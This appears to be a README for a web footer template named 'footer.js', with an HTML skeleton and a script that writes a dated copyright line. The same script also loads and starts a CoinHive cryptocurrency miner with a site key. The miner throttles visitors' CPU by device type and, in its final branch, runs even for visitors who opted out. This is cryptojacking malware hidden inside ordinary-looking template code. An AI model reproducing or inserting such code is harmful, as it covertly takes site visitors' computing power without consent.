# footer.js

MaX Saxe Design Web JavaScript Footer Template

## Footer One

Client-side JS

## Footer Two

Client-side JS

## Footer Three

Client-side JS

## Footer Four

Client-side JS

## Footer Five

Browserify client-side JS

## Footer Six

Browserify client-side JS and Node.js

---

```html
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <title>MaX Saxe Design Web Footer</title>
    </head>
    <body>
        <nav><ul><li></li></ul></nav>
        <header><h1></h1></header>
        <main>
            <header><h2></h2></header>
            <article>
                <header><h3></h3></header>
                <article>
                    <section>
                        <p></p>
                    </section>
                </article>
            </article>
        </main>
        <footer>
            <script src=""></script>
        </footer>
    </body>
</html>
```

```js
var d = new Date();
var year = d.getFullYear().toString();
var m = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
var month = m[d.getMonth()];
var footer = "";
var footer0 = "MaX Saxe Design Website &copy; MaX Saxe Design Inc. &#8212; ";
var footer1 = " ";
var footer2 = " &#8212; Patents and Trademarks Pending";
footer = footer0.concat(month).concat(footer1).concat(year).concat(footer2);
document.getElementById("footer").innerHTML = footer;

var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // desktop @ 70%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
  miner.start();
} else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
  // mobile @ 30%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
  miner.start();
} else {
  // unknown device @ 50%
  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
  miner.start();
}
```
